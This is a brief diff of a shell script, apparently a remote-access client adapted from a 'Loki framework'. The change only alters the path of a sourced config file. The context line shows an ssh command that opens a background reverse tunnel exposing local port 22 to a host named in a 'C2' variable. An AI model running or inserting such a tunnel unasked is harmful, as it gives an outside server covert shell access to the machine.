@@ -8,7 +8,7 @@
 # 21 May 2019 - nju - created file from Loki framework
 ############################################################################### 
 
-source config.sh
+source /opt/einar/client/config.sh
 
 # Setup our SSH Tunnel
 sudo -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f
